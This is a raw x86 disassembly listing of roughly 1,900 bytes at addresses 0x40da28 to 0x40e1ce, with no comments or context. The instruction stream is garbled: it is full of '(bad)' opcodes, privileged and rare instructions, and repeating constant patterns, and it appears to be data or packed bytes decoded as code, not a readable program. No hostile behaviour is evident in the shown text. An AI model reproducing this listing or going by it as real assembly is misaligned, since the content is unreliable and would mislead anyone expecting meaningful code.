  40da28:	inc    ebx
  40da29:	inc    ecx
  40da2a:	add    eax,0x4340
  40da2f:	add    eax,0x404162
  40da34:	add    BYTE PTR [eax+0x43],al
  40da37:	inc    eax
  40da38:	add    eax,0xb4840dae
  40da3d:	aaa    
  40da3e:	inc    esi
  40da3f:	inc    ebp
  40da40:	lahf   
  40da41:	cwd    
  40da43:	mov    cl,0x5
  40da45:	inc    ecx
  40da46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da47:	xor    DWORD PTR [eax+0x2],ecx
  40da4a:	add    eax,0x8a47cb53
  40da4f:	inc    ebx
  40da50:	lahf   
  40da51:	data16 xchg BYTE PTR [ebx+edi*2-0x40ae55dc],ch
  40da59:	lods   al,BYTE PTR ds:[esi]
  40da5a:	pusha  
  40da5b:	add    BYTE PTR [ebx-0x7c],cl
  40da5e:	in     al,0x1f
  40da60:	imul   esp,DWORD PTR [edx],0xffffff98
  40da63:	rcr    DWORD PTR [esi+0x40],1
  40da66:	loope  0x40dadb
  40da68:	pop    ds
  40da69:	fld    QWORD PTR ds:0x408a
  40da6f:	inc    ecx
  40da70:	inc    ebx
  40da71:	add    eax,0x41784062
  40da76:	inc    eax
  40da77:	inc    eax
  40da78:	add    BYTE PTR [edi],cl
  40da7a:	bound  eax,QWORD PTR [ebx+0x0]
  40da7d:	add    eax,0x25006240
  40da82:	inc    eax
  40da83:	add    eax,0x40254143
  40da88:	add    eax,0xc4620000
  40da8d:	xor    DWORD PTR [esi+0x41],eax
  40da90:	imul   esp,DWORD PTR [esi-0x7a],0xffffffa9
  40da94:	dec    esp
  40da95:	ins    BYTE PTR es:[edi],dx
  40da96:	stc    
  40da97:	repnz pop ds
  40da99:	stos   BYTE PTR es:[edi],al
  40da9a:	jnp    0x40da54
  40da9c:	adc    eax,0x4f049f5f
  40daa1:	add    eax,0x43c96297
  40daa6:	das    
  40daa7:	mov    esi,0x43
  40daac:	inc    ecx
  40daad:	inc    eax
  40daae:	bound  esp,QWORD PTR [esi+0x0]
  40dab1:	inc    eax
  40dab2:	add    eax,0x5400000
  40dab7:	inc    ecx
  40dab8:	inc    eax
  40dab9:	inc    eax
  40daba:	bound  esp,QWORD PTR ds:0x25050043
  40dac0:	inc    ecx
  40dac1:	inc    ebx
  40dac2:	inc    eax
  40dac3:	test   BYTE PTR [eax+0x0],al
  40dac6:	bound  ebx,QWORD PTR [eax+0x62]
  40dac9:	inc    ecx
  40daca:	inc    eax
  40dacb:	xchg   edx,eax
  40dacc:	push   eax
  40dacd:	add    eax,0xd8d1416b
  40dad2:	push   ebx
  40dad3:	outs   dx,BYTE PTR ds:[esi]
  40dad4:	xchg   BYTE PTR ds:[edx-0x56],ah
  40dad8:	mov    WORD PTR [edi-0x48],?
  40dadb:	dec    ecx
  40dadc:	push   ebp
  40dadd:	adc    eax,0x483dc3ca
  40dae2:	xor    edx,DWORD PTR [eax-0x58]
  40dae5:	xchg   esi,eax
  40dae6:	test   BYTE PTR [ebx+eax*1+0x7c],cl
  40daea:	pop    esp
  40daeb:	sub    eax,0x15620523
  40daf0:	int    0xf
  40daf2:	xor    DWORD PTR [ebp+0x49],eax
  40daf5:	xchg   dl,al
  40daf7:	retf   
  40daf8:	sub    BYTE PTR [edi],cl
  40dafa:	(bad)  
  40dafb:	repnz pushaw 
  40dafe:	mov    BYTE PTR [eax+0x40621042],dh
  40db04:	inc    ecx
  40db05:	and    eax,0x40000500
  40db0a:	inc    ebx
  40db0b:	add    eax,0x40624041
  40db10:	inc    ebx
  40db11:	add    eax,0x43402541
  40db16:	bound  eax,QWORD PTR [eax+0x43]
  40db19:	int3   
  40db1a:	inc    eax
  40db1b:	bound  eax,QWORD PTR [eax]
  40db1d:	inc    ecx
  40db1e:	inc    eax
  40db1f:	inc    eax
  40db20:	add    eax,0x6ed59305
  40db25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db26:	xchg   ebp,eax
  40db27:	cmova  edx,DWORD PTR [eax]
  40db2a:	aaa    
  40db2b:	stos   BYTE PTR es:[di],al
  40db2d:	jns    0x40db34
  40db2f:	pushf  
  40db30:	gs or  ah,bh
  40db33:	repz inc esi
  40db35:	test   eax,0x62181386
  40db3a:	lock outs dx,BYTE PTR ds:[esi]
  40db3c:	mov    ebx,0x639c7b66
  40db41:	inc    eax
  40db42:	cmc    
  40db43:	xor    al,BYTE PTR [edx-0x5c]
  40db46:	bound  eax,QWORD PTR [eax+0x25]
  40db49:	add    BYTE PTR [esi+0x40],ah
  40db4c:	add    eax,0x40404143
  40db51:	inc    ebx
  40db52:	add    BYTE PTR [eax],al
  40db54:	add    BYTE PTR [edx-0x34],ah
  40db57:	inc    eax
  40db58:	add    eax,0x40004041
  40db5d:	inc    ecx
  40db5e:	int3   
  40db5f:	add    BYTE PTR [ebx-0x7c],al
  40db62:	add    eax,0x5406240
  40db67:	bound  edx,QWORD PTR [esp+esi*2+0x357030b4]
  40db6e:	mov    bl,0x5
  40db70:	add    eax,0x5c6c0535
  40db75:	push   esp
  40db76:	inc    ecx
  40db77:	outs   dx,BYTE PTR ds:[esi]
  40db78:	xchg   ch,bl
  40db7a:	xor    eax,0x50518f7c
  40db7f:	xor    BYTE PTR [ebx],0x6f
  40db82:	jmp    0x6240:0x33fd3a43
  40db89:	pop    eax
  40db8a:	inc    ecx
  40db8b:	add    eax,0x40404340
  40db90:	inc    ebx
  40db91:	inc    eax
  40db92:	test   BYTE PTR [eax],al
  40db94:	add    eax,0x40624041
  40db99:	inc    eax
  40db9a:	add    BYTE PTR [edx+0x5],ah
  40db9d:	inc    ebx
  40db9e:	add    BYTE PTR [eax+0x78],al
  40dba1:	inc    ecx
  40dba2:	add    BYTE PTR [eax+0x41],bl
  40dba5:	bound  edx,QWORD PTR [ebx+edx*4-0x70]
  40dba9:	(bad)
  40dbae:	clc    
  40dbaf:	add    eax,0x382f1641
  40dbb4:	push   ebp
  40dbb5:	cmp    esp,DWORD PTR [edx-0x28cbaf7a]
  40dbbb:	inc    edx
  40dbbc:	push   es
  40dbbd:	inc    edx
  40dbbe:	and    BYTE PTR [edi],dh
  40dbc0:	dec    ebx
  40dbc1:	inc    eax
  40dbc2:	cli    
  40dbc3:	je     0x40dbfb
  40dbc5:	adc    BYTE PTR [edx+0x224cc492],dl
  40dbcb:	mov    edi,DWORD PTR [edx]
  40dbcd:	daa    
  40dbce:	add    ax,0x3d84
  40dbd2:	inc    ecx
  40dbd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbd4:	imul   eax,DWORD PTR [ecx-0x60],0xffffff86
  40dbd8:	(bad)  
  40dbd9:	ret    
  40dbda:	inc    edi
  40dbdb:	cmp    eax,0x2f0d71f3
  40dbe0:	inc    eax
  40dbe1:	test   BYTE PTR [eax],al
  40dbe3:	int3   
  40dbe4:	bound  eax,QWORD PTR ds:0xcc840f41
  40dbea:	inc    ebx
  40dbeb:	add    BYTE PTR [eax+0x0],al
  40dbee:	inc    eax
  40dbef:	inc    eax
  40dbf0:	inc    eax
  40dbf1:	int3   
  40dbf2:	add    BYTE PTR ds:0x62404341,al
  40dbf8:	pop    eax
  40dbf9:	add    BYTE PTR [ebx+0x40],al
  40dbfc:	bound  ecx,QWORD PTR [edi]
  40dbfe:	inc    eax
  40dbff:	test   al,0x1c
  40dc01:	and    al,0x7e
  40dc03:	outs   dx,DWORD PTR ds:[esi]
  40dc04:	lods   eax,DWORD PTR ds:[esi]
  40dc05:	inc    ebx
  40dc06:	xchg   ecx,eax
  40dc07:	in     al,dx
  40dc08:	inc    esp
  40dc09:	cld    
  40dc0a:	jbe    0x40dc02
  40dc0c:	and    al,0x7a
  40dc0e:	add    eax,0xc4404443
  40dc13:	and    dh,BYTE PTR [edx+0x40628654]
  40dc19:	xor    edi,ebp
  40dc1b:	push   0x242123
  40dc20:	add    BYTE PTR [eax+0x40],al
  40dc23:	cmovno eax,DWORD PTR ds:0x40056243
  40dc2a:	int3   
  40dc2b:	add    ah,cl
  40dc2d:	inc    eax
  40dc2e:	inc    eax
  40dc2f:	bound  eax,QWORD PTR [ecx+0x0]
  40dc32:	add    BYTE PTR [edi],cl
  40dc34:	inc    ebx
  40dc35:	inc    eax
  40dc36:	inc    eax
  40dc37:	add    BYTE PTR [ecx+0x43],al
  40dc3a:	add    eax,0x40256240
  40dc3f:	bound  eax,QWORD PTR [eax]
  40dc41:	ret    0x6c67
  40dc44:	std    
  40dc45:	push   ecx
  40dc46:	inc    edx
  40dc47:	jl     0x40dbd9
  40dc49:	xor    al,0x7
  40dc4b:	sbb    DWORD PTR [ebx+0x562f066],ebp
  40dc51:	gs cld 
  40dc53:	inc    ebx
  40dc54:	mov    bl,0xd5
  40dc56:	sub    ch,dl
  40dc58:	xchg   BYTE PTR [edi+0x62],al
  40dc5b:	shr    eax,1
  40dc5d:	fwait
  40dc5e:	inc    eax
  40dc5f:	lahf   
  40dc60:	cs add eax,0x24cd3841
  40dc66:	das    
  40dc67:	leave  
  40dc68:	(bad)  
  40dc69:	and    eax,0x123d7dbc
  40dc6e:	rcr    DWORD PTR ds:0x40cc0005,0x41
  40dc75:	inc    eax
  40dc76:	inc    ebx
  40dc77:	bound  esp,QWORD PTR ds:0x41400043
  40dc7d:	add    BYTE PTR [eax],al
  40dc7f:	add    eax,0x43624062
  40dc84:	inc    ecx
  40dc85:	inc    eax
  40dc86:	inc    eax
  40dc87:	inc    eax
  40dc88:	add    eax,0x40624340
  40dc8d:	add    eax,0x40664140
  40dc92:	add    eax,0x43c87a67
  40dc97:	sub    DWORD PTR [ecx+0x7c],edx
  40dc9a:	xchg   BYTE PTR [eax],ah
  40dc9c:	mov    ah,0x9f
  40dc9e:	ja     0x40dca1
  40dca0:	inc    esp
  40dca1:	sub    DWORD PTR fs:[ebp+0xd],ecx
  40dca5:	sub    cl,ah
  40dca7:	repz push esp
  40dca9:	test   al,0x8e
  40dcab:	test   cl,cl
  40dcad:	inc    edx
  40dcae:	fs push es
  40dcb0:	jecxz  0x40dcf3
  40dcb2:	add    eax,0xb510427d
  40dcb7:	push   ecx
  40dcb8:	outs   dx,BYTE PTR ds:[esi]
  40dcb9:	cmc    
  40dcba:	xchg   BYTE PTR [esi+0x41],dh
  40dcbd:	push   eax
  40dcbe:	pop    ecx
  40dcbf:	push   esp
  40dcc0:	inc    eax
  40dcc1:	imul   edx,DWORD PTR [edi],0x1624153
  40dcc7:	aaa    
  40dcc8:	push   ecx
  40dcc9:	jecxz  0x40dc58
  40dccb:	inc    ebx
  40dccc:	add    BYTE PTR ds:0x41107840,al
  40dcd2:	bound  eax,QWORD PTR [eax+0x40]
  40dcd5:	sldt   WORD PTR [eax-0x34]
  40dcd9:	js     0x40dd3d
  40dcdb:	add    eax,0x40664143
  40dce0:	inc    ebx
  40dce1:	add    BYTE PTR [ecx+0x5],al
  40dce4:	js     0x40dd26
  40dce6:	bound  eax,QWORD PTR [eax+0x0]
  40dce9:	inc    eax
  40dcea:	mov    eax,0x42e740bc
  40dcef:	inc    edx
  40dcf0:	cmp    al,0x5
  40dcf2:	jge    0x40dd6a
  40dcf4:	xor    BYTE PTR [edx],bh
  40dcf6:	jge    0x40dce8
  40dcf8:	mov    ebx,0x6cf77586
  40dcfd:	ficom  WORD PTR [eax+0x6f]
  40dd00:	and    al,0x68
  40dd02:	inc    ecx
  40dd03:	inc    ebx
  40dd04:	inc    eax
  40dd05:	inc    eax
  40dd06:	add    eax,0x434162
  40dd0b:	inc    eax
  40dd0c:	add    BYTE PTR [edx+0x5],ah
  40dd0f:	inc    eax
  40dd10:	adc    BYTE PTR [edx+0x40],ah
  40dd13:	inc    ebx
  40dd14:	inc    ecx
  40dd15:	add    eax,0x4340
  40dd1a:	add    eax,0x404162
  40dd1f:	add    BYTE PTR [eax+0x43],al
  40dd22:	inc    eax
  40dd23:	add    eax,0xb0364144
  40dd28:	pop    edi
  40dd29:	pop    edi
  40dd2a:	dec    edi
  40dd2b:	mov    WORD PTR [eax-0x43],ss
  40dd2e:	inc    ebx
  40dd2f:	mov    al,0x39
  40dd31:	push   eax
  40dd32:	fadd   QWORD PTR ds:0x57d14dc5
  40dd38:	cmc    
  40dd39:	jp     0x40dd8c
  40dd3b:	xchg   BYTE PTR [eax+0x60],al
  40dd3e:	sub    DWORD PTR [ebx+0x600057ff],ebp
  40dd44:	test   eax,0x4daa2778
  40dd49:	nop
  40dd4a:	outs   dx,BYTE PTR ds:[esi]
  40dd4b:	mov    ebp,DWORD PTR [ecx-0x28]
  40dd4e:	inc    eax
  40dd4f:	add    BYTE PTR [eax],al
  40dd51:	inc    ecx
  40dd52:	inc    ebx
  40dd53:	add    eax,0x41784062
  40dd58:	inc    eax
  40dd59:	inc    eax
  40dd5a:	add    BYTE PTR [edi],cl
  40dd5c:	bound  eax,QWORD PTR [ebx+0x0]
  40dd5f:	add    eax,0x25006240
  40dd64:	inc    eax
  40dd65:	add    eax,0x40254143
  40dd6a:	add    eax,0x37620000
  40dd6f:	lea    ebx,[eax+0x6405b434]
  40dd75:	push   esp
  40dd76:	ins    DWORD PTR es:[edi],dx
  40dd77:	(bad)  
  40dd78:	cmp    ch,BYTE PTR [edx]
  40dd7a:	inc    ecx
  40dd7b:	xchg   BYTE PTR [edi-0x4c],al
  40dd7e:	inc    ecx
  40dd7f:	jge    0x40dddb
  40dd81:	dec    ebp
  40dd82:	lods   eax,DWORD PTR ds:[esi]
  40dd83:	jo     0x40dd6e
  40dd85:	inc    ecx
  40dd86:	inc    ebx
  40dd87:	mov    ah,0xf1
  40dd89:	icebp  
  40dd8a:	out    0x8a,al
  40dd8c:	sub    bh,BYTE PTR [ebp+0x664efe30]
  40dd92:	jp     0x40dd99
  40dd94:	or     DWORD PTR [esi-0xc],esi
  40dd97:	push   esi
  40dd98:	adc    ebx,DWORD PTR [ebp+0x51f18661]
  40dd9e:	inc    eax
  40dd9f:	ror    BYTE PTR ds:0x636e6245,0xcc
  40dda6:	xor    ebp,esp
  40dda8:	adc    al,BYTE PTR [ebx+0x0]
  40ddab:	add    BYTE PTR [eax],al
  40ddad:	inc    ecx
  40ddae:	inc    eax
  40ddaf:	bound  esp,QWORD PTR [esi+0x0]
  40ddb2:	inc    eax
  40ddb3:	add    eax,0x5400000
  40ddb8:	inc    ecx
  40ddb9:	inc    eax
  40ddba:	inc    eax
  40ddbb:	bound  esp,QWORD PTR ds:0x25050043
  40ddc1:	inc    ecx
  40ddc2:	inc    ebx
  40ddc3:	inc    eax
  40ddc4:	test   BYTE PTR [eax+0x0],al
  40ddc7:	bound  ebx,QWORD PTR [eax+0x62]
  40ddca:	inc    ecx
  40ddcb:	inc    eax
  40ddcc:	mov    bl,0x64
  40ddce:	mov    DWORD PTR [ebp+ebp*2+0xa271d6c],edi
  40ddd5:	in     al,dx
  40ddd6:	add    eax,0x5ad3282d
  40dddb:	push   ecx
  40dddc:	mov    bl,0x3
  40ddde:	xchg   BYTE PTR [ecx],al
  40dde0:	push   0x4331f34a
  40dde5:	bnd jne 0x40de4c
  40dde8:	mov    al,0xd9
  40ddea:	fwait
  40ddeb:	sbb    BYTE PTR [ecx+0x6f],dh
  40ddee:	mov    BYTE PTR [ecx],dl
  40ddf0:	ret    
  40ddf1:	cmc    
  40ddf2:	adc    eax,0x62105af5
  40ddf7:	inc    eax
  40ddf8:	inc    ecx
  40ddf9:	and    eax,0x40000500
  40ddfe:	inc    ebx
  40ddff:	add    eax,0x40624041
  40de04:	inc    ebx
  40de05:	add    eax,0x43402541
  40de0a:	bound  eax,QWORD PTR [eax+0x43]
  40de0d:	int3   
  40de0e:	inc    eax
  40de0f:	bound  eax,QWORD PTR [eax]
  40de11:	inc    ecx
  40de12:	inc    eax
  40de13:	inc    eax
  40de14:	add    eax,0xa605aa05
  40de19:	mov    eax,0xf2fb4040
  40de1e:	bound  eax,QWORD PTR [esi-0x22b3fa53]
  40de24:	imul   ebp,DWORD PTR [ebp+0x64],0x6f
  40de28:	push   edx
  40de29:	retf   
  40de2a:	adc    bl,BYTE PTR [ebx-0x78d3ace9]
  40de30:	les    eax,FWORD PTR [edx+0x5142dd41]
  40de36:	push   eax
  40de37:	add    eax,0xcc43ab82
  40de3c:	sar    DWORD PTR [ebp+0x406286cc],cl
  40de42:	and    eax,0x5406600
  40de47:	inc    ebx
  40de48:	inc    ecx
  40de49:	inc    eax
  40de4a:	inc    eax
  40de4b:	inc    ebx
  40de4c:	add    BYTE PTR [eax],al
  40de4e:	add    BYTE PTR [edx-0x34],ah
  40de51:	inc    eax
  40de52:	add    eax,0x40004041
  40de57:	inc    ecx
  40de58:	int3   
  40de59:	add    BYTE PTR [ebx-0x7c],al
  40de5c:	add    eax,0x5406240
  40de61:	(bad)  
  40de62:	mov    DWORD PTR [eax+esi*1+0xe],0x21d16143
  40de6a:	test   al,0xc0
  40de6c:	lock out 0x71,eax
  40de6f:	icebp  
  40de70:	rol    DWORD PTR [esi+0x2e407402],0x40
  40de77:	aaa    
  40de78:	test   al,0x5
  40de7a:	iret   
  40de7b:	xor    DWORD PTR [bx+si],esi
  40de7e:	adc    dh,BYTE PTR [ecx-0x479d79be]
  40de84:	ins    BYTE PTR es:[edi],dx
  40de85:	inc    ebx
  40de86:	or     DWORD PTR [ecx+0x2a],esp
  40de89:	sub    al,0x26
  40de8b:	or     eax,0x5144bbf0
  40de90:	inc    eax
  40de91:	test   DWORD PTR ds:0xd0e75cc9,esi
  40de97:	jg     0x40dec3
  40de99:	add    eax,0x40fd403d
  40de9e:	bound  ebx,QWORD PTR [eax+0x41]
  40dea1:	add    eax,0x40404340
  40dea6:	inc    ebx
  40dea7:	inc    eax
  40dea8:	test   BYTE PTR [eax],al
  40deaa:	add    eax,0x40624041
  40deaf:	inc    eax
  40deb0:	add    BYTE PTR [edx+0x5],ah
  40deb3:	inc    ebx
  40deb4:	add    BYTE PTR [eax+0x78],al
  40deb7:	inc    ecx
  40deb8:	add    BYTE PTR [eax+0x41],bl
  40debb:	bound  eax,QWORD PTR [ebp+0xf]
  40debe:	icebp  
  40debf:	inc    ebx
  40dec0:	xchg   dl,bh
  40dec2:	add    DWORD PTR [ebx+0x154c4252],esp
  40dec8:	sub    al,0x63
  40deca:	and    BYTE PTR [eax-0x132e2f36],ch
  40ded0:	test   BYTE PTR [edx-0x33ff7bc0],dl
  40ded6:	bound  eax,QWORD PTR ds:0xcc840f41
  40dedc:	inc    ebx
  40dedd:	add    BYTE PTR [eax+0x0],al
  40dee0:	inc    eax
  40dee1:	inc    eax
  40dee2:	inc    eax
  40dee3:	int3   
  40dee4:	add    BYTE PTR ds:0x62404341,al
  40deea:	pop    eax
  40deeb:	add    BYTE PTR [ebx+0x40],al
  40deee:	bound  ecx,QWORD PTR [edi]
  40def0:	inc    eax
  40def1:	mov    eax,0x26b55651
  40def6:	push   ebp
  40def7:	add    eax,0x2e43c5bf
  40defc:	inc    edx
  40defd:	xor    ecx,ebx
  40deff:	xchg   BYTE PTR [edx],al
  40df01:	dec    esp
  40df02:	xor    esp,DWORD PTR [eax]
  40df04:	fisttp WORD PTR [ecx+0x6f]
  40df07:	sub    DWORD PTR [edx+0x73],ecx
  40df0a:	in     al,dx
  40df0b:	xor    BYTE PTR [ebx-0x6f],0x42
  40df0f:	and    DWORD PTR [edx+0x40],0x40
  40df13:	xchg   ebx,eax
  40df14:	inc    edx
  40df15:	inc    ebx
  40df16:	loop   0x40df1d
  40df18:	imul   ecx,DWORD PTR [eax+0x31],0xd441
  40df1f:	inc    eax
  40df20:	inc    eax
  40df21:	cmovno eax,DWORD PTR ds:0x40056243
  40df28:	int3   
  40df29:	add    ah,cl
  40df2b:	inc    eax
  40df2c:	inc    eax
  40df2d:	bound  eax,QWORD PTR [ecx+0x0]
  40df30:	add    BYTE PTR [edi],cl
  40df32:	inc    ebx
  40df33:	inc    eax
  40df34:	inc    eax
  40df35:	add    BYTE PTR [ecx+0x43],al
  40df38:	add    eax,0x40256240
  40df3d:	bound  eax,QWORD PTR [eax]
  40df3f:	push   eax
  40df40:	xchg   BYTE PTR [si],bh
  40df43:	jns    0x40dfb1
  40df45:	adc    eax,DWORD PTR [edx]
  40df47:	mov    edi,0x80383a79
  40df4c:	lea    esp,[eax+eax*2]
  40df4f:	das    
  40df50:	test   al,0x82
  40df52:	pop    ds
  40df53:	(bad)  
  40df54:	(bad)  
  40df55:	not    DWORD PTR [eax-0x5afa97fa]
  40df5b:	mov    eax,0x32172cf1
  40df60:	cli    
  40df61:	xchg   dh,dl
  40df63:	add    eax,0x37406639
  40df68:	bound  ebp,QWORD PTR [edi]
  40df6a:	inc    ebx
  40df6b:	jae    0x40deee
  40df6d:	ds jb  0x40dfb4
  40df70:	or     DWORD PTR gs:[esi],0xe8ca3642
  40df77:	shl    BYTE PTR [ebp+eax*1-0x33fffae7],1
  40df7e:	inc    eax
  40df7f:	inc    ecx
  40df80:	inc    eax
  40df81:	inc    ebx
  40df82:	bound  esp,QWORD PTR ds:0x41400043
  40df88:	add    BYTE PTR [eax],al
  40df8a:	add    eax,0x43624062
  40df8f:	inc    ecx
  40df90:	inc    eax
  40df91:	inc    eax
  40df92:	inc    eax
  40df93:	add    eax,0x40624340
  40df98:	add    eax,0x40664140
  40df9d:	inc    BYTE PTR [ebx+0x43]
  40dfa0:	inc    ecx
  40dfa1:	add    al,0x38
  40dfa3:	xchg   BYTE PTR [ebx+0x4f],ah
  40dfa6:	xor    edx,DWORD PTR [ebp-0x60]
  40dfa9:	jns    0x40df47
  40dfab:	or     eax,0x9ae8b42a
  40dfb0:	movups XMMWORD PTR [eax-0x80],xmm3
  40dfb4:	sub    al,0x15
  40dfb6:	inc    esp
  40dfb7:	scas   al,BYTE PTR es:[edi]
  40dfb8:	inc    eax
  40dfb9:	xor    eax,DWORD PTR [ebp+eax*1+0x4851cb62]
  40dfc0:	adc    al,0x38
  40dfc2:	sbb    BYTE PTR [esi+0x436b4826],al
  40dfc8:	add    BYTE PTR ds:0x41107840,al
  40dfce:	bound  eax,QWORD PTR [eax+0x40]
  40dfd1:	sldt   WORD PTR [eax-0x34]
  40dfd5:	js     0x40e039
  40dfd7:	add    eax,0x40664143
  40dfdc:	inc    ebx
  40dfdd:	add    BYTE PTR [ecx+0x5],al
  40dfe0:	js     0x40e022
  40dfe2:	bound  eax,QWORD PTR [eax+0x0]
  40dfe5:	inc    eax
  40dfe6:	lds    eax,FWORD PTR [edx+edi*2-0x55]
  40dfea:	inc    eax
  40dfeb:	je     0x40df96
  40dfed:	mov    al,0x4f
  40dfef:	xor    dl,BYTE PTR [esi]
  40dff1:	mov    ah,0xff
  40dff3:	arpl   WORD PTR [ecx+0x527280aa],ax
  40dff9:	lahf   
  40dffa:	add    eax,0x2e43b86d
  40dfff:	inc    esp
  40e000:	arpl   WORD PTR [edi],di
  40e002:	xchg   BYTE PTR [ebp+ecx*1-0x2e],al
  40e006:	test   eax,0x6944ca21
  40e00b:	arpl   bx,cx
  40e00d:	call   0xfc662335
  40e012:	(bad)  
  40e013:	shr    BYTE PTR [ecx+0x5a],cl
  40e016:	shl    BYTE PTR [eax-0x53],cl
  40e019:	inc    ecx
  40e01a:	inc    ebx
  40e01b:	inc    eax
  40e01c:	inc    eax
  40e01d:	add    eax,0x434162
  40e022:	inc    eax
  40e023:	add    BYTE PTR [edx+0x5],ah
  40e026:	inc    eax
  40e027:	adc    BYTE PTR [edx+0x40],ah
  40e02a:	inc    ebx
  40e02b:	inc    ecx
  40e02c:	add    eax,0x4340
  40e031:	add    eax,0x404162
  40e036:	add    BYTE PTR [eax+0x43],al
  40e039:	inc    eax
  40e03a:	add    eax,0x4da9056a
  40e03f:	cmp    al,0x0
  40e041:	retf   
  40e042:	and    DWORD PTR [ebp-0x7a],edx
  40e045:	or     al,0x3f
  40e047:	xchg   esp,eax
  40e048:	add    al,0xe
  40e04a:	stos   BYTE PTR es:[edi],al
  40e04b:	fdiv   QWORD PTR [eax-0x16]
  40e04e:	enter  0xd241,0x40
  40e052:	in     eax,0x10
  40e054:	std    
  40e055:	push   edx
  40e056:	ret    0xda43
  40e059:	or     DWORD PTR [eax+eax*2+0x0],ecx
  40e05d:	add    BYTE PTR [ecx+0x43],al
  40e060:	add    eax,0x41784062
  40e065:	inc    eax
  40e066:	inc    eax
  40e067:	add    BYTE PTR [edi],cl
  40e069:	bound  eax,QWORD PTR [ebx+0x0]
  40e06c:	add    eax,0x25006240
  40e071:	inc    eax
  40e072:	add    eax,0x40254143
  40e077:	add    eax,0xc620000
  40e07c:	add    eax,0x2030e8a7
  40e081:	sub    BYTE PTR [eax+0x627c8647],0xe4
  40e088:	dec    esi
  40e089:	mov    al,ds:0x6b6e502c
  40e08e:	test   al,0x40
  40e090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e091:	or     eax,0x7afc055d
  40e096:	ret    
  40e097:	xor    edi,ebx
  40e099:	inc    eax
  40e09a:	mov    eax,ds:0xbcb00541
  40e09f:	ins    BYTE PTR es:[edi],dx
  40e0a0:	adc    al,0x1f
  40e0a2:	(bad)  
  40e0a3:	lea    eax,[esi-0x7fb8889e]
  40e0a9:	inc    ecx
  40e0aa:	daa    
  40e0ab:	gs inc ebx
  40e0ad:	add    BYTE PTR [eax],al
  40e0af:	add    BYTE PTR [ecx+0x40],al
  40e0b2:	bound  esp,QWORD PTR [esi+0x0]
  40e0b5:	inc    eax
  40e0b6:	add    eax,0x5400000
  40e0bb:	inc    ecx
  40e0bc:	inc    eax
  40e0bd:	inc    eax
  40e0be:	bound  esp,QWORD PTR ds:0x25050043
  40e0c4:	inc    ecx
  40e0c5:	inc    ebx
  40e0c6:	inc    eax
  40e0c7:	test   BYTE PTR [eax+0x0],al
  40e0ca:	bound  ebx,QWORD PTR [eax+0x62]
  40e0cd:	inc    ecx
  40e0ce:	inc    eax
  40e0cf:	jne    0x40e14d
  40e0d1:	mov    bh,0x43
  40e0d3:	push   ds
  40e0d4:	pusha  
  40e0d5:	mov    ebx,0x5398fba8
  40e0da:	shr    DWORD PTR [edx+0x5122f51],1
  40e0e0:	dec    esp
  40e0e1:	mov    esp,0x69032614
  40e0e6:	mov    ah,0x86
  40e0e8:	(bad)  
  40e0ea:	pop    eax
  40e0eb:	clc    
  40e0ec:	fnsave [ecx]
  40e0ee:	adc    eax,0x9cfdfd6f
  40e0f3:	adc    esp,DWORD PTR [eax-0x7c05bd5f]
  40e0f9:	arpl   sp,sp
  40e0fb:	adc    BYTE PTR [edx+0x40],ah
  40e0fe:	inc    ecx
  40e0ff:	and    eax,0x40000500
  40e104:	inc    ebx
  40e105:	add    eax,0x40624041
  40e10a:	inc    ebx
  40e10b:	add    eax,0x43402541
  40e110:	bound  eax,QWORD PTR [eax+0x43]
  40e113:	int3   
  40e114:	inc    eax
  40e115:	bound  eax,QWORD PTR [eax]
  40e117:	inc    ecx
  40e118:	inc    eax
  40e119:	inc    eax
  40e11a:	add    eax,0x4516c005
  40e11f:	push   ebx
  40e120:	add    eax,0xa141481d
  40e125:	and    DWORD PTR [ecx-0x80],0x430d5486
  40e12c:	ins    DWORD PTR es:[edi],dx
  40e12d:	loopne 0x40e167
  40e12f:	jno    0x40e165
  40e131:	fcmove st,st(3)
  40e133:	xor    BYTE PTR ds:0xf97ee305,dl
  40e139:	bound  eax,QWORD PTR [eax+0x25]
  40e13c:	add    BYTE PTR [esi+0x40],ah
  40e13f:	add    eax,0x40404143
  40e144:	inc    ebx
  40e145:	add    BYTE PTR [eax],al
  40e147:	add    BYTE PTR [edx-0x34],ah
  40e14a:	inc    eax
  40e14b:	add    eax,0x40004041
  40e150:	inc    ecx
  40e151:	int3   
  40e152:	add    BYTE PTR [ebx-0x7c],al
  40e155:	add    eax,0x5406240
  40e15a:	(bad)  
  40e15b:	xlat   BYTE PTR ds:[ebx]
  40e15c:	add    al,0xe0
  40e15e:	bound  eax,QWORD PTR [edi]
  40e160:	outs   dx,DWORD PTR ds:[esi]
  40e161:	fld    QWORD PTR ds:0x3c403456
  40e167:	mov    al,ds:0xa88642e1
  40e16c:	inc    edx
  40e16d:	xor    DWORD PTR [eax+0x65],ebp
  40e170:	push   esp
  40e171:	jecxz  0x40e1a1
  40e173:	inc    eax
  40e174:	bound  ebx,QWORD PTR [eax+0x41]
  40e177:	add    eax,0x40404340
  40e17c:	inc    ebx
  40e17d:	inc    eax
  40e17e:	test   BYTE PTR [eax],al
  40e180:	add    eax,0x40624041
  40e185:	inc    eax
  40e186:	add    BYTE PTR [edx+0x5],ah
  40e189:	inc    ebx
  40e18a:	add    BYTE PTR [eax+0x78],al
  40e18d:	inc    ecx
  40e18e:	add    BYTE PTR [eax+0x41],bl
  40e191:	(bad)  
  40e192:	(bad)  
  40e193:	bound  ebp,QWORD PTR [ebp+eax*1+0x67]
  40e197:	loopne 0x40e14e
  40e199:	clc    
  40e19a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e19b:	dec    eax
  40e19c:	fs scas eax,DWORD PTR es:[edi]
  40e19e:	and    BYTE PTR [edi],ah
  40e1a0:	bound  eax,QWORD PTR ds:0x50476564
  40e1a6:	adc    eax,0x33864c2b
  40e1ab:	(bad)  
  40e1ac:	lds    ebp,FWORD PTR [esi+0x71]
  40e1af:	mov    eax,ds:0xd0f4251e
  40e1b4:	lock nop
  40e1b6:	gs mov ebp,0xe62f731
  40e1bc:	stos   DWORD PTR es:[edi],eax
  40e1bd:	inc    eax
  40e1be:	test   BYTE PTR [eax],al
  40e1c0:	int3   
  40e1c1:	bound  eax,QWORD PTR ds:0xcc840f41
  40e1c7:	inc    ebx
  40e1c8:	add    BYTE PTR [eax+0x0],al
  40e1cb:	inc    eax
  40e1cc:	inc    eax
  40e1cd:	inc    eax
  40e1ce:	int3   
